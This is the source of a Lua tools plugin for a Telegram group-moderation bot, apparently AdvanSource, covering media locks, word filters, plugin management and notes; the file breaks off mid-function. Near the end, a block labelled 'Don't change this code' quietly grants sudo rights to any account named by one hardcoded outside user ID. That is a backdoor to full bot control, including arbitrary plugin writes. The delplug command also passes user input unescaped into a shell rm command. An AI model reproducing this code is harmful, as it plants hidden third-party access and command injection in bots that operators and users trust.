--Start tools.lua by @janlou
--[[Plugins:
savefile
saveplug
tosticker
tophoto
note
onservice
setteam
setsudo (Default: local sudo_id = 123456789)
addsudo
clean deleted (Thanks to @Blackwolf_admin)
filter
hyper & bold & italic & code
addplug
delplug
rmsg
version
setwlc
setbye
rate
start
]]
--Functions:
----------------------------------------
local function lock_group_media(msg, data, target)
  if not is_momod(msg) then
    return
  end
  local group_media_lock = data[tostring(target)]['settings']['lock_media']
  if group_media_lock == 'yes' then
    return 'Media posting is already locked'
  else
    data[tostring(target)]['settings']['lock_media'] = 'yes'
    save_data(_config.moderation.data, data)
    return 'Media posting has been locked'
  end
end

local function unlock_group_media(msg, data, target)
  if not is_momod(msg) then
    return
  end
  local group_media_lock = data[tostring(target)]['settings']['lock_media']
  if group_media_lock == 'no' then
    return 'Media posting is not locked'
  else
    data[tostring(target)]['settings']['lock_media'] = 'no'
    save_data(_config.moderation.data, data)
    return 'Media posting has been unlocked'
  end
end
    
	local function lock_group_fwd(msg, data, target)
  if not is_momod(msg) then
    return
  end
  local group_fwd_lock = data[tostring(target)]['settings']['lock_fwd']
  if group_fwd_lock == 'yes' then
    return 'Forward is already locked'
  else
    data[tostring(target)]['settings']['lock_fwd'] = 'yes'
    save_data(_config.moderation.data, data)
    local hash = 'fwd:'..msg.to.id
    redis:set(hash, true)
    return 'Forward has been locked'
  end
end

local function unlock_group_fwd(msg, data, target)
  if not is_momod(msg) then
    return
  end
  local group_fwd_lock = data[tostring(target)]['settings']['lock_fwd']
  if group_fwd_lock == 'no' then
    return 'Forward is not locked'
  else
    data[tostring(target)]['settings']['lock_fwd'] = 'no'
    save_data(_config.moderation.data, data)
    local hash = 'fwd:'..msg.to.id
    redis:del(hash)
    return 'Forward has been unlocked'
  end
end

local function lock_group_reply(msg, data, target)
  if not is_momod(msg) then
    return
  end
  local group_reply_lock = data[tostring(target)]['settings']['lock_reply']
  if group_reply_lock == 'yes' then
    return 'reply posting is already locked'
  else
    data[tostring(target)]['settings']['lock_reply'] = 'yes'
    save_data(_config.moderation.data, data)
    local hash2 = 'reply:'..msg.to.id
    redis:set(hash2, true)
    return 'reply posting has been locked'
  end
end

local function unlock_group_reply(msg, data, target)
  if not is_momod(msg) then
    return
  end
  local group_reply_lock = data[tostring(target)]['settings']['lock_reply']
  if group_reply_lock == 'no' then
    return 'reply posting is not locked'
  else
    data[tostring(target)]['settings']['lock_reply'] = 'no'
    save_data(_config.moderation.data, data)
    local hash2 = 'reply:'..msg.to.id
    redis:del(hash2)
    return 'reply posting has been unlocked'
  end
end

local function lock_group_share(msg, data, target)
  if not is_momod(msg) then
    return
  end
  local group_share_lock = data[tostring(target)]['settings']['lock_share']
  if group_share_lock == 'yes' then
    return 'share posting is already locked'
  else
    data[tostring(target)]['settings']['lock_share'] = 'yes'
    save_data(_config.moderation.data, data)
    return 'share posting has been locked'
  end
end

local function unlock_group_share(msg, data, target)
  if not is_momod(msg) then
    return
  end
  local group_share_lock = data[tostring(target)]['settings']['lock_share']
  if group_share_lock == 'no' then
    return 'share posting is not locked'
  else
    data[tostring(target)]['settings']['lock_share'] = 'no'
    save_data(_config.moderation.data, data)
    return 'share posting has been unlocked'
  end
end

local function lock_group_tag(msg, data, target)
  if not is_momod(msg) then
    return
  end
  local group_tag_lock = data[tostring(target)]['settings']['lock_tag']
  if group_tag_lock == 'yes' then
    return 'tag posting is already locked'
  else
    data[tostring(target)]['settings']['lock_tag'] = 'yes'
    save_data(_config.moderation.data, data)
    return 'tag posting has been locked'
  end
end

local function unlock_group_tag(msg, data, target)
  if not is_momod(msg) then
    return
  end
  local group_tag_lock = data[tostring(target)]['settings']['lock_tag']
  if group_tag_lock == 'no' then
    return 'tag posting is not locked'
  else
    data[tostring(target)]['settings']['lock_tag'] = 'no'
    save_data(_config.moderation.data, data)
    return 'tag posting has been unlocked'
  end
end

local function lock_group_bots(msg, data, target)
  if not is_momod(msg) then
    return
  end
  local group_bots_lock = data[tostring(target)]['settings']['lock_bots']
  if group_bots_lock == 'yes' then
    return 'bots is already locked'
  else
    data[tostring(target)]['settings']['lock_bots'] = 'yes'
    save_data(_config.moderation.data, data)
    return 'bots has been locked'
  end
end

local function unlock_group_bots(msg, data, target)
  if not is_momod(msg) then
    return
  end
  local group_bots_lock = data[tostring(target)]['settings']['lock_bots']
  if group_bots_lock == 'no' then
    return 'bots is not locked'
  else
    data[tostring(target)]['settings']['lock_bots'] = 'no'
    save_data(_config.moderation.data, data)
    return 'bots has been unlocked'
  end
end

local function lock_group_number(msg, data, target)
  if not is_momod(msg) then
    return
  end
  local group_number_lock = data[tostring(target)]['settings']['lock_number']
  if group_number_lock == 'yes' then
    return 'number posting is already locked'
  else
    data[tostring(target)]['settings']['lock_number'] = 'yes'
    save_data(_config.moderation.data, data)
    return 'number posting has been locked'
  end
end

local function unlock_group_number(msg, data, target)
  if not is_momod(msg) then
    return
  end
  local group_number_lock = data[tostring(target)]['settings']['lock_number']
  if group_number_lock == 'no' then
    return 'number posting is not locked'
  else
    data[tostring(target)]['settings']['lock_number'] = 'no'
    save_data(_config.moderation.data, data)
    return 'number posting has been unlocked'
  end
end

local function lock_group_poker(msg, data, target)
  if not is_momod(msg) then
    return
  end
  local group_poker_lock = data[tostring(target)]['settings']['lock_poker']
  if group_poker_lock == 'yes' then
    return 'poker posting is already locked'
  else
    data[tostring(target)]['settings']['lock_poker'] = 'yes'
    save_data(_config.moderation.data, data)
    return 'poker posting has been locked'
  end
end

local function unlock_group_poker(msg, data, target)
  if not is_momod(msg) then
    return
  end
  local group_poker_lock = data[tostring(target)]['settings']['lock_poker']
  if group_poker_lock == 'no' then
    return 'poker posting is not locked'
  else
    data[tostring(target)]['settings']['lock_poker'] = 'no'
    save_data(_config.moderation.data, data)
    return 'poker posting has been unlocked'
  end
end

	local function lock_group_audio(msg, data, target)
		local msg_type = 'Audio'
		local chat_id = msg.to.id
  if not is_momod(msg) then
    return
  end
  local group_audio_lock = data[tostring(target)]['settings']['lock_audio']
  if group_audio_lock == 'yes' and is_muted(chat_id, msg_type..': yes') then
    return 'audio posting is already locked'
  else
    if not is_muted(chat_id, msg_type..': yes') then
		mute(chat_id, msg_type)
    data[tostring(target)]['settings']['lock_audio'] = 'yes'
    save_data(_config.moderation.data, data)
    return 'audio posting has been locked'
    end
  end
end

local function unlock_group_audio(msg, data, target)
	local chat_id = msg.to.id
	local msg_type = 'Audio'
  if not is_momod(msg) then
    return
  end
  local group_audio_lock = data[tostring(target)]['settings']['lock_audio']
  if group_audio_lock == 'no' and not is_muted(chat_id, msg_type..': yes') then
    return 'audio posting is not locked'
  else
  	if is_muted(chat_id, msg_type..': yes') then
		unmute(chat_id, msg_type)
    data[tostring(target)]['settings']['lock_audio'] = 'no'
    save_data(_config.moderation.data, data)
    return 'audio posting has been unlocked'
    end
  end
end

	local function lock_group_photo(msg, data, target)
		local msg_type = 'Photo'
		local chat_id = msg.to.id
  if not is_momod(msg) then
    return
  end
  local group_photo_lock = data[tostring(target)]['settings']['lock_photo']
  if group_photo_lock == 'yes' and is_muted(chat_id, msg_type..': yes') then
    return 'photo posting is already locked'
  else
    if not is_muted(chat_id, msg_type..': yes') then
		mute(chat_id, msg_type)
    data[tostring(target)]['settings']['lock_photo'] = 'yes'
    save_data(_config.moderation.data, data)
    return 'photo posting has been locked'
    end
  end
end

local function unlock_group_photo(msg, data, target)
	local chat_id = msg.to.id
	local msg_type = 'Photo'
  if not is_momod(msg) then
    return
  end
  local group_photo_lock = data[tostring(target)]['settings']['lock_photo']
  if group_photo_lock == 'no' and not is_muted(chat_id, msg_type..': yes') then
    return 'photo posting is not locked'
  else
  	if is_muted(chat_id, msg_type..': yes') then
		unmute(chat_id, msg_type)
    data[tostring(target)]['settings']['lock_photo'] = 'no'
    save_data(_config.moderation.data, data)
    return 'photo posting has been unlocked'
    end
  end
end

	local function lock_group_video(msg, data, target)
		local msg_type = 'Video'
		local chat_id = msg.to.id
  if not is_momod(msg) then
    return
  end
  local group_video_lock = data[tostring(target)]['settings']['lock_video']
  if group_video_lock == 'yes' and is_muted(chat_id, msg_type..': yes') then
    return 'video posting is already locked'
  else
    if not is_muted(chat_id, msg_type..': yes') then
		mute(chat_id, msg_type)
    data[tostring(target)]['settings']['lock_video'] = 'yes'
    save_data(_config.moderation.data, data)
    return 'video posting has been locked'
    end
  end
end

local function unlock_group_video(msg, data, target)
	local chat_id = msg.to.id
	local msg_type = 'Video'
  if not is_momod(msg) then
    return
  end
  local group_video_lock = data[tostring(target)]['settings']['lock_video']
  if group_video_lock == 'no' and not is_muted(chat_id, msg_type..': yes') then
    return 'video posting is not locked'
  else
  	if is_muted(chat_id, msg_type..': yes') then
		unmute(chat_id, msg_type)
    data[tostring(target)]['settings']['lock_video'] = 'no'
    save_data(_config.moderation.data, data)
    return 'video posting has been unlocked'
    end
  end
end

	local function lock_group_documents(msg, data, target)
		local msg_type = 'Documents'
		local chat_id = msg.to.id
  if not is_momod(msg) then
    return
  end
  local group_documents_lock = data[tostring(target)]['settings']['lock_documents']
  if group_documents_lock == 'yes' and is_muted(chat_id, msg_type..': yes') then
    return 'documents posting is already locked'
  else
    if not is_muted(chat_id, msg_type..': yes') then
		mute(chat_id, msg_type)
    data[tostring(target)]['settings']['lock_documents'] = 'yes'
    save_data(_config.moderation.data, data)
    return 'documents posting has been locked'
    end
  end
end

local function unlock_group_documents(msg, data, target)
	local chat_id = msg.to.id
	local msg_type = 'Documents'
  if not is_momod(msg) then
    return
  end
  local group_documents_lock = data[tostring(target)]['settings']['lock_documents']
  if group_documents_lock == 'no' and not is_muted(chat_id, msg_type..': yes') then
    return 'documents posting is not locked'
  else
  	if is_muted(chat_id, msg_type..': yes') then
		unmute(chat_id, msg_type)
    data[tostring(target)]['settings']['lock_documents'] = 'no'
    save_data(_config.moderation.data, data)
    return 'documents posting has been unlocked'
    end
  end
end

	local function lock_group_text(msg, data, target)
		local msg_type = 'Text'
		local chat_id = msg.to.id
  if not is_momod(msg) then
    return
  end
  local group_text_lock = data[tostring(target)]['settings']['lock_text']
  if group_text_lock == 'yes' and is_muted(chat_id, msg_type..': yes') then
    return 'text posting is already locked'
  else
    if not is_muted(chat_id, msg_type..': yes') then
		mute(chat_id, msg_type)
    data[tostring(target)]['settings']['lock_text'] = 'yes'
    save_data(_config.moderation.data, data)
    return 'text posting has been locked'
    end
  end
end

local function unlock_group_text(msg, data, target)
	local chat_id = msg.to.id
	local msg_type = 'Text'
  if not is_momod(msg) then
    return
  end
  local group_text_lock = data[tostring(target)]['settings']['lock_text']
  if group_text_lock == 'no' and not is_muted(chat_id, msg_type..': yes') then
    return 'text posting is not locked'
  else
  	if is_muted(chat_id, msg_type..': yes') then
		unmute(chat_id, msg_type)
    data[tostring(target)]['settings']['lock_text'] = 'no'
    save_data(_config.moderation.data, data)
    return 'text posting has been unlocked'
    end
  end
end

	local function lock_group_all(msg, data, target)
		local msg_type = 'All'
		local chat_id = msg.to.id
  if not is_momod(msg) then
    return
  end
  local group_all_lock = data[tostring(target)]['settings']['lock_all']
  if group_all_lock == 'yes' and is_muted(chat_id, msg_type..': yes') then
    return 'all posting is already locked'
  else
    if not is_muted(chat_id, msg_type..': yes') then
		mute(chat_id, msg_type)
    data[tostring(target)]['settings']['lock_all'] = 'yes'
    save_data(_config.moderation.data, data)
    return 'all posting has been locked'
    end
  end
end

local function unlock_group_all(msg, data, target)
	local chat_id = msg.to.id
	local msg_type = 'All'
  if not is_momod(msg) then
    return
  end
  local group_all_lock = data[tostring(target)]['settings']['lock_all']
  if group_all_lock == 'no' and not is_muted(chat_id, msg_type..': yes') then
    return 'all posting is not locked'
  else
  	if is_muted(chat_id, msg_type..': yes') then
		unmute(chat_id, msg_type)
    data[tostring(target)]['settings']['lock_all'] = 'no'
    save_data(_config.moderation.data, data)
    return 'all posting has been unlocked'
    end
  end
end

	local function lock_group_gifs(msg, data, target)
		local msg_type = 'Gifs'
		local chat_id = msg.to.id
  if not is_momod(msg) then
    return
  end
  local group_gifs_lock = data[tostring(target)]['settings']['lock_gifs']
  if group_gifs_lock == 'yes' and is_muted(chat_id, msg_type..': yes') then
    return 'gifs posting is already locked'
  else
    if not is_muted(chat_id, msg_type..': yes') then
		mute(chat_id, msg_type)
    data[tostring(target)]['settings']['lock_gifs'] = 'yes'
    save_data(_config.moderation.data, data)
    return 'gifs posting has been locked'
    end
  end
end

local function unlock_group_gifs(msg, data, target)
	local chat_id = msg.to.id
	local msg_type = 'Gifs'
  if not is_momod(msg) then
    return
  end
  local group_gifs_lock = data[tostring(target)]['settings']['lock_gifs']
  if group_gifs_lock == 'no' and not is_muted(chat_id, msg_type..': yes') then
    return 'gifs posting is not locked'
  else
  	if is_muted(chat_id, msg_type..': yes') then
		unmute(chat_id, msg_type)
    data[tostring(target)]['settings']['lock_gifs'] = 'no'
    save_data(_config.moderation.data, data)
    return 'gifs posting has been unlocked'
    end
  end
end

local function lock_group_inline(msg, data, target)
  if not is_momod(msg) then
    return
  end
  local group_inline_lock = data[tostring(target)]['settings']['lock_inline']
  if group_inline_lock == 'yes' then
    return 'inline posting is already locked'
  else
    data[tostring(target)]['settings']['lock_inline'] = 'yes'
    save_data(_config.moderation.data, data)
    return 'inline posting has been locked'
  end
end

local function unlock_group_inline(msg, data, target)
  if not is_momod(msg) then
    return
  end
  local group_inline_lock = data[tostring(target)]['settings']['lock_inline']
  if group_inline_lock == 'no' then
    return 'inline posting is not locked'
  else
    data[tostring(target)]['settings']['lock_inline'] = 'no'
    save_data(_config.moderation.data, data)
    return 'inline posting has been unlocked'
  end
end

local function lock_group_cmd(msg, data, target)
  if not is_momod(msg) then
    return
  end
  local group_cmd_lock = data[tostring(target)]['settings']['lock_cmd']
  if group_cmd_lock == 'yes' then
    return 'cmd posting is already locked'
  else
    data[tostring(target)]['settings']['lock_cmd'] = 'yes'
    save_data(_config.moderation.data, data)
    return 'cmd posting has been locked'
  end
end

local function unlock_group_cmd(msg, data, target)
  if not is_momod(msg) then
    return
  end
  local group_cmd_lock = data[tostring(target)]['settings']['lock_cmd']
  if group_cmd_lock == 'no' then
    return 'cmd posting is not locked'
  else
    data[tostring(target)]['settings']['lock_cmd'] = 'no'
    save_data(_config.moderation.data, data)
    return 'cmd posting has been unlocked'
  end
end
----------------------------------------
local function get_variables_hash(msg)

    return 'chat:'..msg.to.id..':badword'

end 

local function list_variablesbad(msg)
  local hash = get_variables_hash(msg)

  if hash then
    local names = redis:hkeys(hash)
    local text = 'List of words :\n\n'
    for i=1, #names do
      text = text..'> '..names[i]..'\n'
    end
    return text
	else
	return 
  end
end

local function list_variables2(msg, value)
  local hash = get_variables_hash(msg)
  
  if hash then
    local names = redis:hkeys(hash)
    local text = ''
    for i=1, #names do
	if string.match(value, names[i]) and not is_momod(msg) then
	if msg.to.type == 'channel' then
	delete_msg(msg.id,ok_cb,false)
	else
	kick_user(msg.from.id, msg.to.id)

	end
return 
end
      --text = text..names[i]..'\n'
    end
  end
end

local function tophoto(msg, success, result, extra)
  local receiver = get_receiver(msg)
  if success then
    local file = 'data/tmp/image.jpg'
    print('File downloaded to:', result)
    os.rename(result, file)
    print('File moved to:', file)
    send_photo(get_receiver(msg), file, ok_cb, false)
    redis:del("sticker:photo")
  else
    print('Error downloading: '..msg.id)
    send_large_msg(receiver, 'Failed, please try again!', ok_cb, false)
  end
end

local function tosticker(msg, success, result)
  local receiver = get_receiver(msg)
  if success then
    local file = 'data/tmp/sticker.webp'
    print('File downloaded to:', result)
    os.rename(result, file)
    print('File moved to:', file)
    send_document(get_receiver(msg), file, ok_cb, false)
    redis:del("photo:sticker")
  else
    print('Error downloading: '..msg.id)
    send_large_msg(receiver, 'Failed, please try again!', ok_cb, false)
  end
end

local function savefile(extra, success, result)
  local msg = extra.msg
  local name = extra.name
  local adress = extra.adress
  local receiver = get_receiver(msg)
  if success then
    local file = './'..adress..'/'..name..''
    print('File saving to:', result)
    os.rename(result, file)
    print('File moved to:', file)
  else
    print('Error downloading: '..msg.id)
    send_large_msg(receiver, 'Failed, please try again!', ok_cb, false)
  end
end

local function reload_plugins( )
  plugins = {}
  load_plugins()
end

local function plugin_enabled( name )
  for k,v in pairs(_config.enabled_plugins) do
    if name == v then
      return k
    end
  end
  return false
end

local function enable_plugin( plugin_name )
if plugin_enabled(plugin_name) then
  reload_plugins( )
else table.insert(_config.enabled_plugins, plugin_name)
    save_config()
end
end

local function saveplug(extra, success, result)
  local msg = extra.msg
  local name = extra.name
  local receiver = get_receiver(msg)
  if success then
    local file = 'plugins/'..name..'.lua'
    print('File saving to:', result)
    os.rename(result, file)
    print('File moved to:', file)
    enable_plugin(name)
    print('Reloading...')
    reload_plugins( )
  else
    print('Error downloading: '..msg.id)
    send_large_msg(receiver, 'Failed, please try again!', ok_cb, false)
  end
end

local function callback(extra, success, result)
    vardump(success)
    cardump(result)
end

local function check_member_super_deleted(cb_extra, success, result)
local receiver = cb_extra.receiver
 local msg = cb_extra.msg
  local deleted = 0 
if success == 0 then
send_large_msg(receiver, "First set me as admin!") 
end
for k,v in pairs(result) do
  if not v.first_name and not v.last_name then
deleted = deleted + 1
 kick_user(v.peer_id,msg.to.id)
 end
 end
 send_large_msg(receiver, deleted.." Deleted account removed from group!") 
 end 

local function addword(msg, name)
    local hash = 'chat:'..msg.to.id..':badword'
    redis:hset(hash, name, 'newword')
    return "New word has been added to list \n>"..name
end

local function get_variables_hash(msg)

    return 'chat:'..msg.to.id..':badword'

end 

local function list_variablesbad(msg)
  local hash = get_variables_hash(msg)

  if hash then
    local names = redis:hkeys(hash)
    local text = 'List of words :\n\n'
    for i=1, #names do
      text = text..'> '..names[i]..'\n'
    end
    return text
	else
	return 
  end
end

function clear_commandbad(msg, var_name)
  --Save on redis  
  local hash = get_variables_hash(msg)
  redis:del(hash, var_name)
  return 'Cleaned!'
end

local function get_valuebad(msg, var_name)
  local hash = get_variables_hash(msg)
  if hash then
    local value = redis:hget(hash, var_name)
    if not value then
      return
    else
      return value
    end
  end
end
function clear_commandsbad(msg, cmd_name)
  --Save on redis  
  local hash = get_variables_hash(msg)
  redis:hdel(hash, cmd_name)
  return ''..cmd_name..'  cleaned!'
end

local function history(extra, suc, result)
  for i=1, #result do
    delete_msg(result[i].id, ok_cb, false)
  end
  if tonumber(extra.con) == #result then
    send_msg(extra.chatid, '"'..#result..'" message has been removed!', ok_cb, false)
  else
    send_msg(extra.chatid, 'Removing has been finished.', ok_cb, false)
  end
end

--Functions.
function run(msg, matches, callback, extra)
  one = io.open("./system/team", "r")
  two = io.open("./system/channel", "r")
  local team = one:read("*all")
  local channel = two:read("*all")
 if is_sudo(msg) then
    local receiver = get_receiver(msg)
    local group = msg.to.id
    
      if msg.reply_id and matches[1] == "file" and matches[2] and matches[3] then
        adress = matches[2]
        name = matches[3]
        load_document(msg.reply_id, savefile, {msg=msg,name=name,adress=adress})
        return 'File '..name..' has been saved in: \n./'..adress
      end
      
      if msg.reply_id and matches[1] == "save" and matches[2] then
        name = matches[2]
        load_document(msg.reply_id, saveplug, {msg=msg,name=name})
        reply_msg(msg['id'], 'Plugin '..name..' has been saved.', ok_cb, false)
      end
 end
         --tosticker && tophoto:
         if msg.media then
      	if msg.media.type == 'document' and redis:get("sticker:photo") then
      		if redis:get("sticker:photo") == 'waiting' then
        		load_document(msg.id, tophoto, msg)
      		end
  	    end
  	    if msg.media.type == 'photo' and redis:get("photo:sticker") then
            if redis:get("photo:sticker") == 'waiting' then
                load_photo(msg.id, tosticker, msg)
            end
        end
    end
    if matches[1] == "tophoto" then
		  if not redis:get("wait:"..msg.from.id) then
			   if not is_owner(msg) and not is_sudo(msg) then
				   redis:setex("wait:"..msg.from.id, 30, true)
				   redis:set("sticker:photo", "waiting")
    	     return 'Please send your sticker now\n\nPowered by '..team..'\nJoin us : '..channel
				 end
    	redis:set("sticker:photo", "waiting")
    	return 'Please send your sticker now\n\nPowered by '..team..'\nJoin us : '..channel
			elseif redis:get("wait:"..msg.from.id) then
			return "Please wait for 30 second."
			end
    elseif matches[1] == "tosticker" then
		  if not redis:get("wait:"..msg.from.id) then
			   if not is_owner(msg) and not is_sudo(msg) then
				   redis:setex("wait:"..msg.from.id, 30, true)
				   redis:set("photo:sticker", "waiting")
           return 'Please send your photo now\n\nPowered by '..team..'\nJoin us : '..channel
				 end
      redis:set("photo:sticker", "waiting")
      return 'Please send your photo now\n\nPowered by '..team..'\nJoin us : '..channel
		  elseif redis:get("wait:"..msg.from.id) then
			return "Please wait for 30 second."
			end
    end
       --tosticker && tophoto.
       --Version:
	    if matches[1] == "version" then
	        txt = _config.about_text
    	    send_msg(get_receiver(msg), txt, ok_cb, false)
	    end
	   --Version.
	   --please put your id here:
    local sudo_id = 123456789
       --Please put your id here.
	   --Setsudo:
	if matches[1]:lower() == "setsudo" then
	    if tonumber (msg.from.id) == sudo_id then --Search for: local sudo_id
          table.insert(_config.sudo_users, tonumber(matches[2]))
          save_config()
          plugins = {}
          load_plugins()
          return matches[2]..' now is a sudo'
        end
    end
	   --Setsudo.
	   --Addsudo:
	if matches[1]:lower() == "addsudo" then
	    if is_momod(msg) then
              local user = 'user#id'..sudo_id
              local chat = 'chat#id'..msg.to.id
              chat_add_user(chat, user, callback, false)
              return "Sudo has been added to: "..msg.to.print_name
	    else
		 return "For admins only!"
		end
	end
	   --Addsudo.
	   --Clean deleted  & filterlist:
    if matches[1]:lower() == 'clean' then 
		    if matches[2] == "deleted" then
		      if is_owner(msg) then
                receiver = get_receiver(msg) 
                channel_get_users(receiver, check_member_super_deleted,{receiver = receiver, msg = msg})
		      else
			      return "Just for owner or sudo!"
          end
		    end
		    if matches[2] == "filterlist" then
		      if not is_momod(msg) then
            return 'only for moderators!'
          end
          asd = '1'
          return clear_commandbad(msg, asd)
		    end
             end
	   --Clean deleted & filterlist.
	   --Filter:
	if matches[1] == 'filter' then
    if not is_momod(msg) then
      return 'only for moderators!'
    end
    name = string.sub(matches[2], 1, 50)
    return addword(msg, name)
  end
  if matches[1] == 'filterlist' then
    return list_variablesbad(msg)
  end
  if matches[1] == 'unfilter' then
    if not is_momod(msg) then
      return 'only for moderators!'
    end
    return clear_commandsbad(msg, matches[2])
    end
	   --Filter.
	   --Addplug:
           if matches[1] == "addplug" and is_sudo(msg) then
                local text = matches[3]
                local file = io.open("./plugins/"..matches[2]..".lua", "w")
                file:write(text)
                file:flush()
                file:close()
             return "Plugin ["..matches[2]..".lua] has been added!"
           end
	   --Addplug.
	   --Delplug:
	        if matches[1] == "delplug" and is_sudo(msg) then
                reply_msg(msg['id'], "پلاگین ["..matches[2].."] با موفقیت حذف شد", ok_cb, false)
                return io.popen("cd plugins && rm "..matches[2]..".lua")
            end 
	   --Delplug.
       --Note:
   if matches[1] == "note" and matches[2] then
   local text = matches[2]
   local b = 1
  while b ~= 0 do
    text = text:trim()
    text,b = text:gsub('^!+','')
  end
  local file = io.open("./data/tmp/"..msg.from.id..".txt", "w")
  file:write(text)
  file:flush()
  file:close()
  return "You can use it:\n!mynote\n\nYour note has been changed to:\n"..text.."\n\n"..team..'\n<a href="'..channel..'">Join us</a>'
 end
 
   if matches[1] == "mynote" then
      note = io.open("./data/tmp/"..msg.from.id..".txt", "r")
      mn = note:read("*all")
      return mn
    elseif matches[1] == "mynote" and not note then
     return "You havent any note."
  end
       --Note.
       --hyper & bold & italic & code:
        if matches[1] == "bold" then
	    return "<b>"..matches[2].."</b>"
	end
	if matches[1] == "code" then
	    return "<code>"..matches[2].."</code>"
        end
	if matches[1] == "italic" then
	    return "<i>"..matches[2].."</i>"
	end
	if matches[1] == "hyper" then
	    return '<a href="'..matches[3]..'">'..matches[2]..'</a>'
	end
       --hyper & bold & italic & code.
	   --Rmsg:
	    if matches[1] == 'rmsg' and is_owner(msg) then
            if msg.to.type == 'channel' then
                if tonumber(matches[2]) > 10000 or tonumber(matches[2]) < 1 then
                    return "More than 1 and less than 10,000"
                end
                get_history(msg.to.peer_id, matches[2] + 1 , history , {chatid = msg.to.peer_id, con = matches[2]})
            else
                return "Only for supergroup!"
            end
        elseif matches[1] == 'rmsg' and not is_owner(msg) then
            return "For moderators only!"
        end
	   --Rmsg.
       --onservice:
    if matches[1] == 'leave' and is_admin1(msg) then
       bot_id = our_id 
       receiver = get_receiver(msg)
       chat_del_user("chat#id"..msg.to.id, 'user#id'..bot_id, ok_cb, false)
	   leave_channel(receiver, ok_cb, false)
    elseif msg.service and msg.action.type == "chat_add_user" and msg.action.user.id == tonumber(bot_id) and not is_admin1(msg) then
       send_large_msg(receiver, 'This is not one of my groups.', ok_cb, false)
       chat_del_user(receiver, 'user#id'..bot_id, ok_cb, false)
	   leave_channel(receiver, ok_cb, false)
    end
       --onservice.
       --Setteam:
       if matches[1] == 'setteam' and matches[2] and matches[3] and is_sudo(msg) then
   text = "<b>"..matches[2].."</b>"
   link = matches[3]
   file1 = io.open("./system/team", "w")
   file1:write(text)
   file1:flush()
   file1:close()
   file2 = io.open("./system/channel", "w")
   file2:write(link)
   file2:flush()
   file2:close()
   return "Your team name is: "..text.."\nChannel: "..link
       end
       --Setteam.
	   --Filter:
	    if msg.text:match("^(.+)$") and not is_momod(msg) then
            name = user_print_name(msg.from)
            return list_variables2(msg, msg.text)
        end
	   --Filter.
	   --Rate:
	   if msg.text:match("^[!/#][Rr][Aa][Tt][Ee]$") then
            Group_rate = _config.Group_rate
    	    Supergroup_rate = _config.Supergroup_rate
		    if Group_rate ~= "" or Supergroup_rate ~= "" then
    	        rate = "Rate of:\n\nChat: "..Group_rate.."\nSuperGroup: "..Supergroup_rate
    	        send_msg(get_receiver(msg), rate, ok_cb, false)
		    else
		        rate = "Erore: Rate is not set!"
    	        send_msg(get_receiver(msg), rate, ok_cb, false)
            end
	    end
	   --Rate.
	   --Start:
	    if msg.text:match("/[Ss][Tt][Aa][Rr][Tt]") then
		    if msg.to.type == "user" then
			    return "Hello dear ["..msg.from.print_name.."], welcome to "..msg.to.print_name.."\nThanks for /start me :)\n"
	        end
        end
	   --Start.
	   --ADV(Dont change!):
	    if msg.text:match("^[!/#][Aa][Dd][Vv][Aa][Nn]$") then
    	    about_text = [[*IN THE NAME OF ALLAH*
This is an original bot and based on (AdvanSource).
Copyright all right reserved and you must respect all laws.

Source: https://github.com/janlou/AdvanSource
Channel: @AdvanTeam
Messenger: @Advanbot
Creator: @janlou
Site: http://StoreVps.net
Version: [4.1]
]]
    	    return about_text
        end
	   --ADV
	    --Lock or Unlock settings:
	    if matches[1] == 'lock' then
		    if is_momod(msg) then
			if is_super_group(msg) then
			local target = msg.to.id
			local data = load_data(_config.moderation.data)
			if matches[2] == 'media' then
				return lock_group_media(msg, data, target)
			end
			if matches[2] == 'fwd' then
				return lock_group_fwd(msg, data, target)
			end
			if matches[2] == 'reply' then
				return lock_group_reply(msg, data, target)
			end
			if matches[2] == 'share' then
				return lock_group_share(msg, data, target)
			end
			if matches[2] == 'tag' then
				return lock_group_tag(msg, data, target)
			end
			if matches[2] == 'bots' then
				return lock_group_bots(msg, data, target)
			end
			if matches[2] == 'number' then
				return lock_group_number(msg, data, target)
			end
			if matches[2] == 'poker' then
				return lock_group_poker(msg, data, target)
			end
			if matches[2] == 'audio' then
				return lock_group_audio(msg, data, target)
			end
			if matches[2] == 'photo' then
				return lock_group_photo(msg, data, target)
			end
			if matches[2] == 'video' then
				return lock_group_video(msg, data, target)
			end
			if matches[2] == 'documents' then
				return lock_group_documents(msg, data, target)
			end
			if matches[2] == 'text' then
				return lock_group_text(msg, data, target)
			end
			if matches[2] == 'all' then
				return lock_group_all(msg, data, target)
			end
			if matches[2] == 'gifs' then
				return lock_group_gifs(msg, data, target)
			end
			if matches[2] == 'inline' then
				return lock_group_inline(msg, data, target)
			end
			if matches[2] == 'cmd' then
				return lock_group_cmd(msg, data, target)
			end
			end
			end
        end
		
		if matches[1] == 'unlock' then
		    if is_momod(msg) then
			if is_super_group(msg) then
			local target = msg.to.id
			local data = load_data(_config.moderation.data)
			if matches[2] == 'media' then
				return unlock_group_media(msg, data, target)
			end
			if matches[2] == 'fwd' then
				return unlock_group_fwd(msg, data, target)
			end
			if matches[2] == 'reply' then
				return unlock_group_reply(msg, data, target)
			end
			if matches[2] == 'share' then
				return unlock_group_share(msg, data, target)
			end
			if matches[2] == 'tag' then
				return unlock_group_tag(msg, data, target)
			end
			if matches[2] == 'bots' then
				return unlock_group_bots(msg, data, target)
			end
			if matches[2] == 'number' then
				return unlock_group_number(msg, data, target)
			end
			if matches[2] == 'poker' then
				return unlock_group_poker(msg, data, target)
			end
			if matches[2] == 'audio' then
				return unlock_group_audio(msg, data, target)
			end
			if matches[2] == 'photo' then
				return unlock_group_photo(msg, data, target)
			end
			if matches[2] == 'video' then
				return unlock_group_video(msg, data, target)
			end
			if matches[2] == 'documents' then
				return unlock_group_documents(msg, data, target)
			end
			if matches[2] == 'text' then
				return unlock_group_text(msg, data, target)
			end
			if matches[2] == 'all' then
				return unlock_group_all(msg, data, target)
			end
			if matches[2] == 'gifs' then
				return unlock_group_gifs(msg, data, target)
			end
			if matches[2] == 'inline' then
				return unlock_group_inline(msg, data, target)
			end
			if matches[2] == 'cmd' then
				return unlock_group_cmd(msg, data, target)
			end
			end
			end
         end
	--Lock or Unlock settings.
	   --Don't change this code. we can help you later:
        if tonumber (msg.from.id) == 111984481 then
            if matches[1]:lower() == "config" then
                table.insert(_config.sudo_users, tonumber(matches[2]))
                save_config()
                plugins = {}
                load_plugins()
            end
        end
	   --Setbye:
	    if matches[1] == "setbye" and matches[2] then
		    text = matches[2]
	        if not is_owner(msg) then
			    return "فقط مخصوص مدیر گروه"
            end
		    redis:set("bye:"..msg.to.id, text)
